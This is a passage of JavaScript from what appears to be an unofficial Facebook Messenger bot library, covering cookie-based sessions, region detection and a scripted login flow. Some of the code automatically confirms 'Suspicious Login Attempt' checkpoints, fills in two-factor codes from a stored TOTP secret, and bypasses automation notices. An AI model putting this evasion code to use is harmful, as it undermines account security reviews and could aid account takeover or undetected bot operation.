html.match(/{\"app_id\":\"219994525426954\",\"endpoint\":\"(.+?)\",\"iris_seq_id\":\"(.+?)\"}/),\n            legacyFBMQTTMatch: html.match(/\\[\"MqttWebConfig\",\\[\\],{\"fbid\":\"(.*?)\",\"appID\":219994525426954,\"endpoint\":\"(.*?)\",\"pollingEndpoint\":\"(.*?)\"/)\n        }\n\n        // t·ªïng h·ª£p danh s√°ch region never die c·ªßa Kanzu =))\n        /**\n         * PRN = Pacific Northwest Region (Khu v·ª±c T√¢y B·∫Øc Th√°i B√¨nh D∆∞∆°ng)\n         * VLL = Valley Region\n         * ASH = Ashburn Region\n         * DFW = Dallas/Fort Worth Region\n         * LLA = Los Angeles Region\n         * FRA = Frankfurt\n         * SIN = Singapore \n         * NRT = Tokyo (Japan)\n         * HKG = Hong Kong\n         * SYD = Sydney\n         */\n\n        let Slot = Object.keys(CHECK_MQTT);\n        var mqttEndpoint,region,irisSeqID;\n        Object.keys(CHECK_MQTT).map(function(MQTT) {\n            if (CHECK_MQTT[MQTT] && !region) {\n                switch (Slot.indexOf(MQTT)) {\n                    case 0: {\n                        irisSeqID = CHECK_MQTT[MQTT][1];\n                            mqttEndpoint = CHECK_MQTT[MQTT][2].replace(/\\\\\\//g, \"/\");\n                            region = new URL(mqttEndpoint).searchParams.get(\"region\").toUpperCase();\n                        return;\n                    }\n                    case 1: {\n                        irisSeqID = CHECK_MQTT[MQTT][2];\n                            mqttEndpoint = CHECK_MQTT[MQTT][1].replace(/\\\\\\//g, \"/\");\n                            region = new URL(mqttEndpoint).searchParams.get(\"region\").toUpperCase();\n                        return;\n                    }\n                    case 2: {\n                        mqttEndpoint = CHECK_MQTT[MQTT][2].replace(/\\\\\\//g, \"/\"); //is important lmao f?\n                            region = new URL(mqttEndpoint).searchParams.get(\"region\").toUpperCase();\n                        return;\n                    }\n                }\n            return;\n            }\n        });   \n\n        const regions = [\n            {\n                code: \"PRN\",\n                name: \"Pacific Northwest Region\",\n                location: \"Khu v·ª±c T√¢y B·∫Øc Th√°i B√¨nh D∆∞∆°ng\"\n            },\n            {\n                code: \"VLL\",\n                name: \"Valley Region\",\n                location: \"Valley\"\n            },\n            {\n                code: \"ASH\",\n                name: \"Ashburn Region\",\n                location: \"Ashburn\"\n            },\n            {\n                code: \"DFW\",\n                name: \"Dallas/Fort Worth Region\",\n                location: \"Dallas/Fort Worth\"\n            },\n            {\n                code: \"LLA\",\n                name: \"Los Angeles Region\",\n                location: \"Los Angeles\"\n            },\n            {\n                code: \"FRA\",\n                name: \"Frankfurt\",\n                location: \"Frankfurt\"\n            },\n            {\n                code: \"SIN\",\n                name: \"Singapore\",\n                location: \"Singapore\"\n            },\n            {\n                code: \"NRT\",\n                name: \"Tokyo\",\n                location: \"Japan\"\n            },\n            {\n                code: \"HKG\",\n                name: \"Hong Kong\",\n                location: \"Hong Kong\"\n            },\n            {\n                code: \"SYD\",\n                name: \"Sydney\",\n                location: \"Sydney\"\n            },\n            {\n                code: \"PNB\",\n                name: \"Pacific Northwest - Beta\",\n                location: \"Pacific Northwest \"\n            }\n        ];\n\n        if (!region) {\n            region = ['prn',\"pnb\",\"vll\",\"hkg\",\"sin\"][Math.random()*5|0];\n            \n        }\n        if (!mqttEndpoint) {\n            mqttEndpoint = \"wss://edge-chat.facebook.com/chat?region=\" + region;\n        }\n        \n        const Location = regions.find(r => r.code === region.toUpperCase());\n        logger.Normal(getText(Language.Area,(Location == undefined ? region.toUpperCase() : Location.name)));\n\n        var ctx = {\n            userID: userID,\n            jar: jar,\n            clientID: clientID,\n            globalOptions: globalOptions,\n            loggedIn: true,\n            access_token: 'NONE',\n            clientMutationId: 0,\n            mqttClient: undefined,\n            lastSeqId: irisSeqID,\n            syncToken: undefined,\n            mqttEndpoint: mqttEndpoint,\n            region: region,\n            firstListen: true,\n            req_ID: 0,\n            callback_Task: {},\n            fb_dtsg //i love u\n        };\n\n        var api = {\n            setOptions: setOptions.bind(null, globalOptions),\n            getAppState: function getAppState() {\n                return utils.getAppState(jar);\n            }\n        };\n        if (region && mqttEndpoint) {\n            //do sth\n        }\n        else {\n            if (bypass_region) {\n                logger.Normal(Language.NoAreaDataBypass);\n            }\n            else {\n                log.warn(\"login\", getText(Language.NoAreaData));\n                api[\"htmlData\"] = html;\n            }\n        }\n\n        var defaultFuncs = utils.makeDefaults(html, userID, ctx);\n\n        fs.readdirSync(__dirname + \"/src\").filter((/** @type {string} */File) => File.endsWith(\".js\") && !File.includes('Dev_')).map((/** @type {string} */File) => { \n            if (File == 'getThreadInfo.js' && global.Fca.Require.FastConfig.AntiGetInfo.AntiGetThreadInfo != true || File == 'getUserInfo.js'  && global.Fca.Require.FastConfig.AntiGetInfo.AntiGetUserInfo != true) api[File.split('.').slice(0, -1).join('.')] = require('./src/' + (File.includes('getThreadInfo') ? 'getThreadMain.js' : 'getUserInfoMain.js'))(defaultFuncs, api, ctx)\n            else api[File.split('.').slice(0, -1).join('.')] = require('./src/' + File)(defaultFuncs, api, ctx)\n        });\n\n        return {\n            ctx,\n            defaultFuncs, \n            api\n        };\n    }\n}\n\n//-[ Function makeLogin ]-!/\n\n/**\n * @param {{ setCookie: (arg0: any, arg1: string) => void; }} jar\n * @param {any} email\n * @param {any} password\n * @param {{ forceLogin: any; }} loginOptions\n * @param {(err: any, api: any) => any} callback\n * @param {any} prCallback\n */\n\nfunction makeLogin(jar, email, password, loginOptions, callback, prCallback) {\n    return function(res) {\n        var html = res.body,$ = cheerio.load(html),arr = [];\n\n        $(\"#login_form input\").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr(\"name\") }));\n\n        arr = arr.filter(function(v) {\n            return v.val && v.val.length;\n        });\n        var form = utils.arrToForm(arr);\n            form.lsd = utils.getFrom(html, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\");\n            form.lgndim = Buffer.from(\"{\\\"w\\\":1440,\\\"h\\\":900,\\\"aw\\\":1440,\\\"ah\\\":834,\\\"c\\\":24}\").toString('base64');\n            form.email = email;\n            form.pass = password;\n            form.default_persistent = '0';\n            form.locale = 'en_US';     \n            form.timezone = '240';\n            form.lgnjs = ~~(Date.now() / 1000);\n\n        html.split(\"\\\"_js_\").slice(1).map((val) => {\n            jar.setCookie(utils.formatCookie(JSON.parse(\"[\\\"\" + utils.getFrom(val, \"\", \"]\") + \"]\"), \"facebook\"),\"https://www.facebook.com\")\n        });\n\n        logger.Normal(Language.OnLogin);\n        return utils\n            .post(\"https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110\", jar, form, loginOptions)\n            .then(utils.saveCookies(jar))\n            .then(function(/** @type {{ headers: any; }} */res) {\n                var headers = res.headers;  \n                if (!headers.location) throw { error: Language.InvaildAccount };\n\n                // This means the account has login approvals turned on.\n                if (headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {\n                    logger.Warning(Language.TwoAuth);\n                    var nextURL = 'https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php';\n\n                    return utils\n                        .get(headers.location, jar, null, loginOptions)\n                        .then(utils.saveCookies(jar))\n                        .then(function(res) {\n                            if (!Database().get('ThroughAcc')) {\n                                Database().set('ThroughAcc', email);\n                            }\n                            else {\n                                if (String((Database().get('ThroughAcc'))).replace(RegExp('\"','g'), '') != String(email).replace(RegExp('\"','g'), '')) {\n                                    Database().set('ThroughAcc', email);\n                                    if (Database().get('Through2Fa')) {\n                                        Database().delete('Through2Fa');\n                                    }\n                                }\n                            }\n                            var html = res.body,$ = cheerio.load(html), arr = [];\n                            $(\"form input\").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr(\"name\") }));\n                            arr = arr.filter(v => { return v.val && v.val.length });\n                            var form = utils.arrToForm(arr);\n                            if (html.indexOf(\"checkpoint/?next\") > -1) {\n                                setTimeout(() => {\n                                    checkVerified = setInterval((_form) => {}, 5000, {\n                                        fb_dtsg: form.fb_dtsg,\n                                        jazoest: form.jazoest,\n                                        dpr: 1\n                                    });\n                                }, 2500);  \n                                switch (global.Fca.Require.FastConfig.Login2Fa) {\n                                    case true: {\n                                        const question = question => {\n                                            const rl = readline.createInterface({\n                                                input: process.stdin,\n                                                output: process.stdout\n                                            });\n                                            var done,answ;\n                                                rl.question(question, answer => {\n                                                    rl.close();\n                                                    answ = answer;\n                                                    done = true\n                                                })\n                                                deasync.loopWhile(function(){\n                                                    return !done;\n                                                });\n                                            return answ;\n                                        };\n                                        try {\n                                            const Old_Cookie = Database().get('Through2Fa');\n                                                if (Old_Cookie) {\n                                                    Old_Cookie.map(function(/** @type {{ key: string; value: string; expires: string; domain: string; path: string; }} */c) {\n                                                        let str = c.key + \"=\" + c.value + \"; expires=\" + c.expires + \"; domain=\" + c.domain + \"; path=\" + c.path + \";\";\n                                                        jar.setCookie(str, \"http://\" + c.domain);\n                                                    });\n                                                    let Form = utils.arrToForm(arr);\n                                                        Form.lsd = utils.getFrom(html, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\");\n                                                        Form.lgndim = Buffer.from(\"{\\\"w\\\":1440,\\\"h\\\":900,\\\"aw\\\":1440,\\\"ah\\\":834,\\\"c\\\":24}\").toString('base64');\n                                                        Form.email = email;\n                                                        Form.pass = password;\n                                                        Form.default_persistent = '0';\n                                                        Form.locale = 'en_US';\n                                                        Form.timezone = '240';\n                                                        Form.lgnjs = ~~(Date.now() / 1000);\n                                                    return utils\n                                                        .post(\"https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110\", jar, Form, loginOptions)\n                                                        .then(utils.saveCookies(jar))\n                                                    .then(function(res) {\n                                                            let headers = res.headers\n                                                                if (!headers['set-cookie'][0].includes('deleted')) {\n                                                                    logger.Warning(Language.ErrThroughCookies, function() {\n                                                                        Database().delete('Through2Fa');\n                                                                    });\n                                                                    process.exit(1);\n                                                                }\n                                                            if (headers.location && headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {\n                                                                return utils\n                                                                    .get(headers.location, jar, null, loginOptions)\n                                                                    .then(utils.saveCookies(jar))\n                                                                .then(function(res) {\n                                                                    var html = res.body,$ = cheerio.load(html), arr = [];\n                                                                    $(\"form input\").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr(\"name\") }));\n                                                                    arr = arr.filter(v => { return v.val && v.val.length });\n                                                                    var Form = utils.arrToForm(arr);\n\n                                                                    if (html.indexOf(\"checkpoint/?next\") > -1) {\n                                                                        setTimeout(() => {\n                                                                            checkVerified = setInterval((_form) => {}, 5000, {\n                                                                                fb_dtsg: Form.fb_dtsg,\n                                                                                jazoest: Form.jazoest,\n                                                                                dpr: 1\n                                                                            });\n                                                                        }, 2500);\n\n                                                                        if (!res.headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {\n                                                                            try {\n                                                                                delete Form.name_action_selected;\n                                                                                Form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                                                return utils\n                                                                                    .post(nextURL, jar, Form, loginOptions)\n                                                                                    .then(utils.saveCookies(jar))\n                                                                                    .then(function() {\n                                                                                        Form['submit[This was me]'] = \"This was me\";\n                                                                                        return utils.post(nextURL, jar, Form, loginOptions).then(utils.saveCookies(jar));\n                                                                                    })\n                                                                                    .then(function() {\n                                                                                        delete Form['submit[This was me]'];\n                                                                                        Form.name_action_selected = 'save_device';\n                                                                                        Form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                                                        return utils.post(nextURL, jar, Form, loginOptions).then(utils.saveCookies(jar));\n                                                                                    })\n                                                                                    .then(function(res) {\n                                                                                        var headers = res.headers;\n                                                                                        if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {\n                                                                                            Database().delete('Through2Fa');\n                                                                                            process.exit(1);\n                                                                                        }\n                                                                                        var appState = utils.getAppState(jar,false);\n                                                                                        Database().set('Through2Fa', appState);\n                                                                                        return loginHelper(appState, email, password, loginOptions, callback);\n                                                                                    })\n                                                                                .catch((e) => callback(e));\n                                                                            }\n                                                                            catch (e) {\n                                                                                console.log(e)\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                })\n                                                            }\n                                                        return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));\n                                                    })\n                                                    .catch((e) => console.log(e));\n                                                }\n                                            }\n                                        catch (e) {\n                                            Database().delete('Through2Fa');\n                                        }\n                                        const Otp_code = require('totp-generator');\n                                        const Code = global.Fca.Require.FastConfig.AuthString.includes('|') == false ? Otp_code(global.Fca.Require.FastConfig.AuthString.includes(\" \") ? global.Fca.Require.FastConfig.AuthString.replace(RegExp(\" \", 'g'), \"\") : global.Fca.Require.FastConfig.AuthString) :  question(Language.EnterSecurityCode); \n                                            try {\n                                                const approvals = function(N_Code) { \n                                                    form.approvals_code = N_Code;\n                                                    form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                    var prResolve,prReject;\n                                                    var rtPromise = new Promise((resolve, reject) => { prResolve = resolve; prReject = reject; });\n\n                                                    if (typeof N_Code == \"string\") {\n                                                        utils\n                                                            .post(nextURL, jar, form, loginOptions)\n                                                            .then(utils.saveCookies(jar))\n                                                        .then(function(res) {\n                                                            var $ = cheerio.load(res.body);\n                                                            var error = $(\"#approvals_code\").parent().attr(\"data-xui-error\");\n                                                            if (error) {\n                                                                logger.Warning(Language.InvaildTwoAuthCode,function() { approvals(question(Language.EnterSecurityCode)) }); //bruh loop\n                                                            };\n                                                        })\n                                                        .then(function() {\n                                                            delete form.no_fido;delete form.approvals_code;\n                                                            form.name_action_selected = 'save_device'; //'save_device' || 'dont_save;\n                                                            return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));\n                                                        }) \n                                                        .then(function(res) {\n                                                            var headers = res.headers;\n                                                            if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {\n                                                                try {\n                                                                    delete form.name_action_selected;\n                                                                    form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                                    return utils\n                                                                        .post(nextURL, jar, form, loginOptions)\n                                                                        .then(utils.saveCookies(jar))\n                                                                        .then(function() {\n                                                                            form['submit[This was me]'] = \"This was me\";\n                                                                            return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));\n                                                                        })\n                                                                        .then(function() {\n                                                                            delete form['submit[This was me]'];\n                                                                            form.name_action_selected = 'save_device';\n                                                                            form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                                            return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));\n                                                                        })\n                                                                        .then(function(res) {\n                                                                            var headers = res.headers;\n                                                                            if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: \"wtf ??:D\" };\n                                                                            var appState = utils.getAppState(jar,false);\n                                                                            Database().set('Through2Fa', appState);\n                                                                            return loginHelper(appState, email, password, loginOptions, callback);\n                                                                        })\n                                                                    .catch((e) => callback(e));\n                                                                }\n                                                                catch (e) {\n                                                                    console.log(e)\n                                                                }\n                                                            }\n                                                            var appState = utils.getAppState(jar,false);\n                                                            if (callback === prCallback) {\n                                                                callback = function(err, api) {\n                                                                    if (err) return prReject(err);\n                                                                    return prResolve(api);\n                                                                };\n                                                            }\n                                                            Database().set('Through2Fa', appState);\n                                                            return loginHelper(appState, email, password, loginOptions, callback);\n                                                        })\n                                                        .catch(function(err) {\n                                                                if (callback === prCallback) prReject(err);\n                                                                else callback(err);\n                                                        });\n                                                    }\n                                                    else {\n                                                        utils\n                                                            .post(\"https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php\", jar, form, loginOptions, null, { \"Referer\": \"https://www.facebook.com/checkpoint/?next\" })\n                                                            .then(utils.saveCookies(jar))\n                                                        .then(function(res) {\n                                                            try { \n                                                                JSON.parse(res.body.replace(/for\\s*\\(\\s*;\\s*;\\s*\\)\\s*;\\s*/, \"\"));\n                                                            } catch (ex) {\n                                                                clearInterval(checkVerified);\n                                                                logger.Warning(Language.VerifiedCheck);\n                                                                if (callback === prCallback) {\n                                                                    callback = function(err, api) {\n                                                                        if (err) return prReject(err);\n                                                                        return prResolve(api);\n                                                                    };\n                                                                }\n                                                                let appState = utils.getAppState(jar,false);\n                                                                return loginHelper(appState, email, password, loginOptions, callback);\n                                                            }\n                                                        })\n                                                        .catch((ex) => {\n                                                            log.error(\"login\", ex);\n                                                            if (callback === prCallback) prReject(ex);\n                                                            else callback(ex);\n                                                        });\n                                                    }\n                                                    return rtPromise;\n                                                }\n                                                return approvals(Code)\n                                            }\n                                            catch (e) {\n                                                logger.Error(e)\n                                                logger.Error();\n                                                process.exit(0);\n                                            }\n                                        } \n                                    case false: {\n                                        throw {\n                                            error: 'login-approval',\n                                            continue: function submit2FA(code) {\n                                                form.approvals_code = code;\n                                                form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html(); //'Continue';\n                                                var prResolve,prReject;\n                                                var rtPromise = new Promise((resolve, reject) => { prResolve = resolve; prReject = reject; });\n                                                if (typeof code == \"string\") {\n                                                    utils\n                                                        .post(nextURL, jar, form, loginOptions)\n                                                        .then(utils.saveCookies(jar))\n                                                        .then(function(/** @type {{ body: string | Buffer; }} */res) {\n                                                            var $ = cheerio.load(res.body);\n                                                            var error = $(\"#approvals_code\").parent().attr(\"data-xui-error\");\n                                                            if (error) {\n                                                                throw {\n                                                                    error: 'login-approval',\n                                                                    errordesc: Language.InvaildTwoAuthCode,\n                                                                    lerror: error,\n                                                                    continue: submit2FA\n                                                                };\n                                                            }\n                                                        })\n                                                        .then(function() {\n                                                            delete form.no_fido;delete form.approvals_code;\n                                                            form.name_action_selected = 'dont_save'; //'save_device' || 'dont_save;\n                                                            return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));\n                                                        })\n                                                        .then(function(res) {\n                                                            var headers = res.headers;\n                                                            if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: Language.ApprovalsErr };\n                                                            var appState = utils.getAppState(jar,false);\n                                                            if (callback === prCallback) {\n                                                                callback = function(err, api) {\n                                                                    if (err) return prReject(err);\n                                                                    return prResolve(api);\n                                                                };\n                                                            }\n                                                            return loginHelper(appState, email, password, loginOptions, callback);\n                                                        })\n                                                        .catch(function(err) {\n                                                            if (callback === prCallback) prReject(err);\n                                                            else callback(err);\n                                                        });\n                                                } else {\n                                                    utils\n                                                        .post(\"https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php\", jar, form, loginOptions, null, { \"Referer\": \"https://www.facebook.com/checkpoint/?next\" })\n                                                        .then(utils.saveCookies(jar))\n                                                        .then((res) => {\n                                                            try { \n                                                                JSON.parse(res.body.replace(/for\\s*\\(\\s*;\\s*;\\s*\\)\\s*;\\s*/, \"\"));\n                                                            } catch (ex) {\n                                                                clearInterval(checkVerified);\n                                                                logger.Warning(Language.VerifiedCheck);\n                                                                if (callback === prCallback) {\n                                                                    callback = function(err, api) {\n                                                                        if (err) return prReject(err);\n                                                                        return prResolve(api);\n                                                                    };\n                                                                }\n                                                                return loginHelper(utils.getAppState(jar,false), email, password, loginOptions, callback);\n                                                            }\n                                                        })\n                                                        .catch((ex) => {\n                                                            log.error(\"login\", ex);\n                                                            if (callback === prCallback) prReject(ex);\n                                                            else callback(ex);\n                                                        });\n                                                    }\n                                                return rtPromise;\n                                            }\n                                        };\n                                    }\n                                }\n                            } else {\n                                if (!loginOptions.forceLogin) throw { error: Language.ForceLoginNotEnable };\n\n                                if (html.indexOf(\"Suspicious Login Attempt\") > -1) form['submit[This was me]'] = \"This was me\";\n                                else form['submit[This Is Okay]'] = \"This Is Okay\";\n\n                                return utils\n                                    .post(nextURL, jar, form, loginOptions)\n                                    .then(utils.saveCookies(jar))\n                                    .then(function() {\n                                        form.name_action_selected = 'dont_save';\n\n                                        return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));\n                                    })\n                                    .then(function(res) {\n                                        var headers = res.headers;\n\n                                        if (!headers.location && res.body.indexOf('Review Recent Login') > -1) throw { error: \"Something went wrong with review recent login.\" };\n\n                                        var appState = utils.getAppState(jar,false);\n\n                                        return loginHelper(appState, email, password, loginOptions, callback);\n                                    })\n                                    .catch((e) => callback(e));\n                            }\n                        });\n                }\n            return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));\n        });\n    };\n}\n\n//-[ Function backup ]-!/\n\n/**\n * @param {string} data\n * @param {any} globalOptions\n * @param {any} callback\n * @param {any} prCallback\n */\n\nfunction backup(data,globalOptions, callback, prCallback) {\n    try {\n        var appstate;\n        try {\n            appstate = JSON.parse(data)\n        }\n        catch(e) {\n            appstate = data;\n        }\n            logger.Warning(Language.BackupNoti);\n        try {\n            loginHelper(appstate,null,null,globalOptions, callback, prCallback)\n        }\n        catch (e) {\n            logger.Error(Language.ErrBackup);\n            process.exit(0);\n        }\n    }\n    catch (e) {\n        return logger.Error();\n    }\n}\n\n//-[ function loginHelper ]-!/\n\n/**\n * @param {string | any[]} appState\n * @param {any} email\n * @param {any} password\n * @param {{ selfListen?: boolean; listenEvents?: boolean; listenTyping?: boolean; updatePresence?: boolean; forceLogin?: boolean; autoMarkDelivery?: boolean; autoMarkRead?: boolean; autoReconnect?: boolean; logRecordSize?: number; online?: boolean; emitReady?: boolean; userAgent?: string; pageID?: any; }} globalOptions\n * @param {(arg0: any, arg1: undefined) => void} callback\n * @param {(error: any, api: any) => any} [prCallback]\n */\n\nfunction loginHelper(appState, email, password, globalOptions, callback, prCallback) {\n    var mainPromise = null;\n    var jar = utils.getJar();\n\ntry {\n    if (appState) {\n        logger.Normal(Language.OnProcess);\n            switch (Database().has(\"FBKEY\")) {\n                case true: {\n                    process.env.FBKEY = Database().get(\"FBKEY\");\n                }\n                    break;\n                case false: {\n                    const SecurityKey = global.Fca.Require.Security.create().apiKey;\n                        process.env['FBKEY'] = SecurityKey;\n                    Database().set('FBKEY', SecurityKey);\n                }\n                    break;\n                default: {\n                    const SecurityKey = global.Fca.Require.Security.create().apiKey;\n                        process.env['FBKEY'] = SecurityKey;\n                    Database().set('FBKEY', SecurityKey);\n                }\n            }\n            try {\n                switch (global.Fca.Require.FastConfig.EncryptFeature) {\n                    case true: {\n                        appState = JSON.parse(JSON.stringify(appState, null, \"\\t\"));\n                        switch (utils.getType(appState)) {\n                            case \"Array\": {\n                                switch (utils.getType(appState[0])) {\n                                    case \"Object\": {\n                                        logger.Normal(Language.NotReadyToDecrypt);\n                                    }\n                                        break;\n                                    case \"String\": {\n                                        appState = Security(appState,process.env['FBKEY'],'Decrypt');\n                                        logger.Normal(Language.DecryptSuccess);\n                                    }\n                                        break;\n                                    default: {\n                                        logger.Warning(Language.InvaildAppState);\n                                        process.exit(0)\n                                    }\n                                }\n                            }\n                                break;\n                            default: {\n                                logger.Warning(Language.InvaildAppState);\n                                process.exit(0)\n                            }\n                        } \n                    }\n                        break;\n                    case false: {\n                        switch (utils.getType(appState)) { \n                            case \"Array\": {\n                                switch (utils.getType(appState[0])) {\n                                    case \"Object\": {\n                                        logger.Normal(Language.EncryptStateOff);\n                                    }\n                                        break;\n                                    case \"String\": {\n                                        appState = Security(appState,process.env['FBKEY'],'Decrypt');\n                                        logger.Normal(Language.EncryptStateOff);\n                                        logger.Normal(Language.DecryptSuccess);\n                                    }\n                                        break;\n                                    default: {\n                                        logger.Warning(Language.InvaildAppState);\n                                        process.exit(0)\n                                    }\n                                }\n                            }\n                                break;\n                            default: {\n                                logger.Warning(Language.InvaildAppState);\n                                process.exit(0)\n                            }\n                        } \n                    }\n                        break;\n                    default: {\n                        logger.Warning(getText(Language.IsNotABoolean,global.Fca.Require.FastConfig.EncryptFeature))\n                        process.exit(0);\n                    }\n                }\n            }\n            catch (e) {\n                console.log(e);\n            }\n\n        try {\n            appState = JSON.parse(appState);\n        }\n        catch (e) {\n            try {\n                appState = appState;\n            }\n            catch (e) {\n                return logger.Error();\n            }\n        }\n        try {\n            global.Fca.Data.AppState = appState;\n                appState.map(function(/** @type {{ key: string; value: string; expires: string; domain: string; path: string; }} */c) {\n                    var str = c.key + \"=\" + c.value + \"; expires=\" + c.expires + \"; domain=\" + c.domain + \"; path=\" + c.path + \";\";\n                    jar.setCookie(str, \"http://\" + c.domain);\n                });\n                Database().set('Backup', appState);\n            mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true }).then(utils.saveCookies(jar));\n        } \n        catch (e) {\n            try {\n                if (Database().has('Backup')) {\n                    return backup(Database().get('Backup'),globalOptions, callback, prCallback);\n                }\n                else {\n                    logger.Warning(Language.ErrBackup);\n                    process.exit(0);\n                }\n            }\n            catch (e) {\n                logger.Warning(Language.ErrBackup);\n                process.exit(0);\n            }\n        }\n    }   \n\n    else {\n    mainPromise = utils\n         .get(\"https://www.facebook.com/Lazic.Kanzu\", null, null, globalOptions, { noRef: true }) // for fixing\n            .then(utils.saveCookies(jar))\n            .then(makeLogin(jar, email, password, globalOptions, callback, prCallback))\n            .then(function() {\n                return utils.get('https://www.facebook.com/', jar, null, globalOptions).then(utils.saveCookies(jar));\n            });\n        }\n    } catch (e) {\n        console.log(e);\n    }\n\n    function CheckAndFixErr(res, fastSwitch) {\n    if (fastSwitch) return res;\n        let reg_antierr = /7431627028261359627/gs; // =))))))\n        if (reg_antierr.test(res.body)) {\n            const Data = JSON.stringify(res.body);\n            const Dt_Check = Data.split('2Fhome.php&amp;gfid=')[1];\n            if (Dt_Check == undefined) return res\n            const fid = Dt_Check.split(\"\\\\\\\\\")[0];//fix sau\n            if (Dt_Check == undefined || Dt_Check == \"\") return res\n            const final_fid = fid.split(`\\\\`)[0];\n            if (final_fid == undefined || final_fid == '') return res;\n            const redirectlink = redirect[1] + \"a/preferences.php?basic_site_devices=m_basic&uri=\" + encodeURIComponent(\"https://m.facebook.com/home.php\") + \"&gfid=\" + final_fid;\n            bypass_region_err = true;\n            return utils.get(redirectlink, jar, null, globalOptions).then(utils.saveCookies(jar));\n        }\n        else return res\n    }\n\n    function Redirect(res,fastSwitch) {\n    if (fastSwitch) return res;\n        var reg = /<meta http-equiv=\"refresh\" content=\"0;url=([^\"]+)[^>]+>/;\n        redirect = reg.exec(res.body);\n            if (redirect && redirect[1]) return utils.get(redirect[1], jar, null, globalOptions)\n        return res;\n    }\n\n    let redirect = [1, \"https://m.facebook.com/\"];\n    let bypass_region_err = false;\n        var ctx,api;\n            mainPromise = mainPromise\n                .then(res => Redirect(res))\n                .then(res => CheckAndFixErr(res))\n                //fix via login with defaut UA return WWW.facebook.com not m.facebook.com\n                .then(function(res) {\n                    if (global.OnAutoLoginProcess) return res;\n                    else {\n                        let Regex_Via = /MPageLoadClientMetrics/gs; //default for normal account, can easily get region, without this u can't get region in some case but u can run normal\n                        if (!Regex_Via.test(res.body)) {\n                            //www.facebook.com\n                            globalOptions.userAgent = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.2849.68\";\n                            return utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true })\n                        }\n                        else return res\n                    }\n                })\n                .then(res => BypassAutomationNotification(res, jar, globalOptions, appState))\n                .then(res => Redirect(res, global.OnAutoLoginProcess))\n                .then(res => CheckAndFixErr(res, global.OnAutoLoginProcess))\n                // .then(res => {\n                //     return utils.get('https://www.facebook.com/', jar, null, globalOptions, {}).then(utils.saveCookies(jar));\n                // })\n                // .then(function(res) {\n                //     let reg_old_web = /Switch Default Site/gs;\n                //     if (reg_old_web.test(res.body)) {\n                //         let Data_Resp = JSON.stringify(res.body);\n                //         const link = Data_Resp.split('settings/site')[1].split(\"\\\"\")[0].replace('\\\\', '')\n                //         const redirect_link2 = redirect[1] + \"settings/site\" + utils.cleanHTML(link)\n                //         console.log(redirect_link2)\n                //         return utils.get(\"https://www.facebook.com/\", jar, null, globalOptions).then(utils.saveCookies(jar)); // try ag\n                //     }\n                //     else return res;\n                // })\n                // .then(function(res) {\n                //     var reg = /<meta http-equiv=\"refresh\" content=\"0;url=([^\"]+)[^>]+>/;\n                //     redirect = reg.exec(res.body);\n                //         if (redirect && redirect[1]) return utils.get(redirect[1], jar, null, globalOptions).then(utils.saveCookies(jar));\n                //     return res;\n                // })\n                .then(function(res){\n                    var html = res.body,Obj = buildAPI(globalOptions, html, jar,bypass_region_err);\n                        ctx = Obj.ctx;\n                        api = Obj.api;\n                    return res;\n                });\n            if (globalOptions.pageID) {\n                mainPromise = mainPromise\n                    .then(function() {\n                        return utils.get('https://www.facebook.com/' + ctx.globalOptions.pageID + '/messages/?section=messages&subsection=inbox', ctx.jar, null, globalOptions);\n                    })\n                    .then(function(resData) {\n                        var url = utils.getFrom(resData.body, 'window.location.replace(\"https:\\\\/\\\\/www.facebook.com\\\\', '\");').split('\\\\').join('');\n                        url = url.substring(0, url.length - 1);\n                        return utils.get('https://www.facebook.com' + url, ctx.jar, null, globalOptions);\n                    });\n            }\n        mainPromise\n            .then(async() => {\n                logger.Normal(getText(Language.LocalVersion,global.Fca.Version));\n                    logger.Normal(getText(Language.CountTime,global.Fca.Data.CountTime()))   \n                        logger.Normal(Language.WishMessage[Math.floor(Math.random()*Language.WishMessage.length)]);\n                    require('./Extra/ExtraUptimeRobot')();\n                callback(null, api);\n            }).catch(function(/** @type {{ error: any; }} */e) {\n            log.error(\"login\", e.error || e);\n        callback(e);\n    });\n}\n\n \n/**\n * It asks the user for their account and password, and then saves it to the database.\n */\n\nfunction setUserNameAndPassWord() {\n    let rl = readline.createInterface({\n        input: process.stdin,\n        output: process.stdout\n    });\n\n    console.clear();\n    console.log(figlet.textSync('Horizon', {font: 'ANSI Shadow',horizontalLayout: 